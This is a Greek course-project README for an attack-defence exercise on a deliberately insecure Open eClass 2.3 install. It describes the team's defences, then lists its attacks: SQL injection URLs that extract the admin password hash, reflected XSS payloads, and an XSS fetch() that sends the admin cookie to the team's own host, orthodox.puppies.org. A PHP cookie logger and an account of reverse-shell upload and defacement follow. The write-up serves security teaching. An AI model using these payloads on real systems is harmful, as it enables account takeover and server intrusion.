## Open eClass 2.3

Το repository αυτό περιέχει μια __παλιά και μη ασφαλή__ έκδοση του eclass.
Προορίζεται για χρήση στα πλαίσια του μαθήματος
[Προστασία & Ασφάλεια Υπολογιστικών Συστημάτων (ΥΣ13)](https://ys13.chatzi.org/), __μην τη
χρησιμοποιήσετε για κάνενα άλλο σκοπό__.


### Χρήση μέσω docker
```
# create and start (the first run takes time to build the image)
docker-compose up -d

# stop/restart
docker-compose stop
docker-compose start

# stop and remove
docker-compose down -v
```

To site είναι διαθέσιμο στο http://localhost:8001/. Την πρώτη φορά θα πρέπει να τρέξετε τον οδηγό εγκατάστασης.


### Ρυθμίσεις eclass

Στο οδηγό εγκατάστασης του eclass, χρησιμοποιήστε __οπωσδήποτε__ τις παρακάτω ρυθμίσεις:

- Ρυθμίσεις της MySQL
  - Εξυπηρέτης Βάσης Δεδομένων: `db`
  - Όνομα Χρήστη για τη Βάση Δεδομένων: `root`
  - Συνθηματικό για τη Βάση Δεδομένων: `1234`
- Ρυθμίσεις συστήματος
  - URL του Open eClass : `http://localhost:8001/` (προσοχή στο τελικό `/`)
  - Όνομα Χρήστη του Διαχειριστή : `drunkadmin`

Αν κάνετε κάποιο λάθος στις ρυθμίσεις, ή για οποιοδήποτε λόγο θέλετε να ρυθμίσετε
το openeclass από την αρχή, διαγράψτε το directory, `openeclass/config` και ο
οδηγός εγκατάστασης θα τρέξει ξανά.

## 2022 Project 1

Εκφώνηση: https://ys13.chatzi.org/assets/projects/project1.pdf


### Μέλη ομάδας

- 1115 2018 00106, Μαραντίδης Θεοφάνης
- 1115 2017 00262, Κουκουλάρης Εμμανουήλ

### Report


# Άμυνες

### Cross Site Request Forgery

Μία από τις κυρίαρχες ευπάθειες του open eclass ήταν αυτή του CSRF, καθώς τόσο το πλήθος των csrf ευπαθειών όσο και η σημαντικότητα τους βάζει σε μεγάλο κίνδυνο την εφαρμογή και τα δεδομένα των χρηστών. Πιο συγκεκριμένα, σε πολλά html forms που γίνονται submit απο τον administrator μπορούν εύκολα να χρησιμοποιηθούν για επιθέσεις CSRF διότι λείπει η λειτουργία του csrf token το οποίο μπορεί να αποτρέψει τέτοιου είδους επιθέσεων. Σε όλες τις φόρμες παράγαμε ένα csrf token, τo οποίο αποθηκευόταν σε όλες τις html φορμες ως hidden input HTML element και σαν session μεταβλητή (δηλαδή εντοιχίζεται το SESSID του χρήστη με ένα csrf token). Μόλις γινόταν το form submission, ελέγχαμε εάν το session csrf token είναι ίδιο με αυτό του HTML form submission και λαμβάναμε αντίστοιχη απόφαση. To ίδιο πρότυπο εμφανιζόταν και σε ενέργειες οι οποίες μπορούσαν να εκτελεστούν με ένα GET request. Σε αυτές τις περιπτώσεις, προσθέταμε ένα csrf token σαν url παράμετρο.

### Remote File Inclusion
Στην περιοχή ανταλλαγής αρχείων κατά το ανέβασμα του αρχείου υπάρχει έλεγχος έτσι ώστε να μην επιτρέπονται επικίνδυνοι τύποι αρχείων όπως
('exe', 'php', 'js', 'bat', 'sh', 'html','php','php3','php4','php5','php6','php7','php8','phps','pl','py','pyc','pyo','jsp','asp','htm','html','shtml','phtml','sh','cgi') 
Επίσης φροντίζουμε να αλλάζουμε τα δικαιώματα του φακέλου με 
chmod(“path”,0222) έτσι ώστε οι επιτηθέμενοι να μην μπορούν σε καμία περίπτωση να “εκτελέσουν” κάποιο κακόβουλο αρχείο.

Αντίστοιχα και για τις εργασίες κάνουμε exclude τους παραπάνω τύπους αρχείων και παραμετροποιούμε λίγο παραπάνω το τυχαίο όνομα που αποθηκεύεται η εργασία στον server μας.
Ακόμη προσθέσαμε rules στο htaccess του apache conf ετσι ώστε να περιορίσουμε και το directory listing που ηταν εφικτό αλλά και την πρόσβαση στους “secret” φακέλους από τρίτους. Με αυτόν τον τρόπο ότι βρισκόταν κάτω από το directory  /var/www/openeclass/courses/TMA*/work/  πετούσε 403 Forbidden response status. 
Ακόμη ένα μέτρο ασφαλείας που προσθέσαμε για αυτό το directory και για το
/var/www/openeclass/courses/TMA*/dropbox/
ήταν το σετάρισμα του php_flag engine off έτσι ώστε να μην είναι δυνατό το execution php κώδικα.
Το ανέβασμα κακόβουλου αρχείου ήταν εφικτό και από το /var/www/openeclass/modules/import/import.php καθώς εκεί δεν υπήρχε κανένας έλεγχος για τον τύπο του. Εμείς αποφασίσαμε να αφαιρέσουμε αυτη την λειτουργία καθώς δεν ήταν στις “κύριες” που αναφέρθηκαν.



### SQL Injection

Κατα την εξέταση της εφαρμογής του open eclass για κενά ασφαλείας που μπορούν να προκληθούν απο βλαβερή είσοδο του χρήστη για την επιδίωξη SQL injection, επιλέξαμε να διαχωρίσουμε τα είδη ευπαθειών σε δύο κατηγορίες. Στην πρώτη κατηγορία, όπου το SQL ερώτημα λάμβανε ως είσοδο μόνο αριθμούς, κάναμε χρήση της συνάρτησης intval() για να εξασφαλίσουμε ότι η παράμετρος του SQL ερωτήματος που θα ληφθεί από το χρήστη είναι σίγουρα αριθμός. Στην δεύτερη κατηγορία, όπου οι παράμετροι του SQL ερωτήματος που εξαρτάται από την είσοδο του χρήστη, δεν είναι αριθμοί, τότε μετατρέψαμε τα αντίστοιχα SQL ερωτήματα σε SQL prepared statements για να είμαστε σίγουροι ότι η είσοδος του χρήστη δεν θα μπορέσει να προκαλέσει το leak δεδομένων, διότι το SQL ερώτημα έχει ουαστικά ήδη εκτελεστεί σε διαφορετικό context.



### XSS

Στον συγκεκριμένο τύπο ευπάθειας, επιλέξαμε να κάνουμε χρήση του **Content Security Policy**, με χρήση χρήση script-src όπως παρακάτω:
```php
$nonce = $_SESSION['nonce'] = uniqid();
header("Content-Security-Policy: script-src 'nonce-$nonce'");
```
Δεδομένου ότι σε όλα τα scripts που προϋπήρχαν στην εφαρμογή έπρεπε να φέρουν το attribute ‘nonce’ με την συγκεκριμένη παραπάνω τιμή.

Σε κάποια άλλα σημεία επιλέξαμε να κάνουμε χρήση της συνάρτησης htmlspecialchars(), η οποία περνούσε από φίλτρο τους ειδικούς χαρακτήρες μετατρέποντάς τους σε html entities, αποτρέποντας έτσι τα scripts να καταλήγουν στην ίδια μορφή με την οποία έγιναν εισαγωγή από το χρήστη, αποφεύγοντας. Επιλέξαμε να χρησιμοποιήσουμε τη συνάρτηση αυτή σε ευπάθειες που είχαν μεγαλύτερη συχνότητα μέσα στην εφαρμογή, όπως για παράδειγμα στην μεταβλητή PHP_SELF.

# Επιθέσεις

### SQL Injection

Σε ένα unpatched open eclass version, με την επίθεση στο module /upgrade/upgrade.php το οποίο ήταν ευπαθές σε sql injection επίθεση διότι το πεδίο του username δεν περνούσε από έλεγχο. Άρα με είσοδο του username:
```
' OR user.user_id='1..2..3..4..5'  OR '1'='1
```
και user.user_id=1 που είναι και το id του **drunkadmin**, το sql statement αποτιμάται σε true και καταλήγουμε να αποκτάμε δικαιώματα διαχειριστή. Τη συγκεκριμένη ευπάθεια την είχαν καλύψει οι αντίπαλοι, οπότε η επίθεση δεν είχε κάποιο αποτέλεσμα.

Κάποιες άλλες επιθέσεις που δοκιμάσαμε και απέτυχαν στους αντιπάλους ήταν οι παρακάτω:
```
/modules/phpbb/reply.php?topic=3&forum=666') union select 1 as forum_type, password as forum_name,1 as forum_access, 1 as topic_title from eclass.user where username="drunkadmin" --%20
```

```
/modules/phpbb/viewtopic.php?topic=666' union select password as topic_title, 1 from eclass.user-- &forum=1')--%20
```
```
/modules/phpbb/newtopic.php?forum=%') union select password as forum_name,1 as forum_access ,1 as forum_type from eclass.user where username="drunkadmin" --%20
```

```
/modules/work/work.php?id=1%27%20AND%201=2%20UNION%20SELECT%201,password,3,4,5,6,7,8,9,10%20from%20eclass.user%20where%20username=%22drunkadmin%22%20--%20–
```

Στο module **unreguser/unregcours.php** εκτελέσαμε το παρακάτω SQL Injection με το οποίο καταφέραμε να πάρουμε το hash του κωδικού του drunkadmin. 
```
/modules/unreguser/unregcours.php?cid=TMA100'AND 0=1 UNION SELECT password FROM eclass.user WHERE username="drunkadmin" or'a'='a &u=5
```


Εκμεταλευόμενοι την ίδια ευπάθεια, καταφέραμε να αποκτήσουμε πρόσβαση το table της βάσης που κάνει την αντιστοίχιση των πραγματικών ονομάτων των αρχείων που ανεβαίνουν από την λειτουργία “Ανταλλαγή αρχείων” με το tempfilename το οποίο είναι μία τυχαία συμβολοσειρά. Με αυτόν τον τρόπο, θα μπορούσαμε να βρούμε το αντίστοιχο όνομα του αρχείου reverse shell που είχαμε ανεβάσει. 
```
/modules/unreguser/unregcours.php?cid=TMA100 AND 200=1 UNION SELECT filename from TMA100.dropbox_file or’a’=a%20&u=4
```
Παρόλα αυτά, η επίθεση αυτή δεν είχε κάποιο αποτέλεσμα καθώς η εφαρμογή ήταν προστατευόμενη από κανόνες htaccess. Σαν επιπλέον επίπεδο ασφάλειας, οι αμυνόμενοι είχαν μετατρέψει την κατάληξη των php αρχείων σε .pdf

Στο module “Εργασίες” παρατηρήσαμε ότι μόνο αρχεία .zip επιτρέπονταν να μεταφορτωθούν και γι’ αυτό και δεν ξοδέψαμε χρόνο στο σημείο αυτό.

### XSS

Κάποιες από τις επιθέσεις XSS που λειτούργησαν, είναι οι παρακάτω:

```
http://victim.csec.org/modules/auth/newuser.php?nom_form='><script>alert(1)</script>
```

```
http://victim.csec.org/modules/phpbb/viewtopic.php?topic=1) UNION SELECT "a","<script>alert('100')</script>" FROM forums f, topics t WHERE 1=1 OR (1=2 &forum=1
```
```
http://victim.csec.org/modules/auth/newuser.php?nom_form='><script>alert(1)</script>
```
```
http://victim.csec.org/modules/work/work.php?id=1'--<script>alert("orthodox")</script>
```
```
http://victim.csec.org/modules/profile/profile.php/"><script>alert(1000)</script>
```

```
http://victim.csec.org/modules/auth/courses.php/""><script>alert(111)</script>
```

### CSRF

Εκμεταλλευόμενοι την XSS ευπάθεια:
```
http://defender.org/modules/auth/courses.php/%22%3E<script> fetch('http://orthodox.puppies.org/index.php?cookie='.concat(document.cookie)); </script>
``` 
επιλέξαμε να κατασκευάσουμε ένα php αρχείο στο οποίο θα κάναμε redirect τον drunkadmin στο συγκεκριμένο url και σαν JS payload ορίσαμε την κλήση της συνάρτησης fetch() (και concat()) η οποία εκτελούσε ένα GET request στο puppies site μας, μεταφέροντας σαν url παράμετρο στο get request url το cookie του drunkadmin(διότι η document.cookie εκτελέστηκε στον browser του).
```php
<?php

function redirect($url, $statusCode = 303) {
        header('Location: ' . $url, true, $statusCode);
        die();
}

// case where drunkadmin clicks the link
if (!isset($_GET['cookie'])) {
                echo 'not set';
                $newloc = "http://victim.csec.org/modules/work/work.php";
                $location = "http://victim.csec.org/modules/auth/courses.php/%22%3E<script> fetch('http://orthodox.puppies.org/index.php?cookie='.concat(document.cookie)); </script>";
                redirect($location);
}
// case where fetch command is executed on the browser of the drunkadmin
// sending his cookie with a GET request
$file = fopen("/tmp/stolen-cookies.txt","a");
fwrite($file, $_GET['cookie'].PHP_EOL.PHP_EOL); // write cookie into a file
fclose($file);
?>

``` 


Αφού ο drunkadmin επέλεξε το link, λάβαμε το phpsession id token του drunkadmin, δίνοντάς μας πρόσβαση στο λογαριασμό του αλλάξαμε τον κωδικό  του admin και δώσαμε admin δικαιώματα στους χρήστες μας. 

Αφού εξασφαλίσαμε την πρόσβαση στον admin, ανεβάσαμε μέσω του import.php module ένα reverse shell php και μέσω αυτού αποκτήσαμε πρόσβαση στο filesystem του server ως www-data που είχε πλήρη δικαιώματα read/write στις σελίδες. Με βάση το παραπάνω, τοποθετήσαμε την δική μας σελίδα ως index.php ως deface.

Επίσης με την εισαγωγή μιας σελίδας απο το import.php, κάναμε include τον κατάλογο config όπου βρισκόταν ο κωδικός της mysql βάσης.

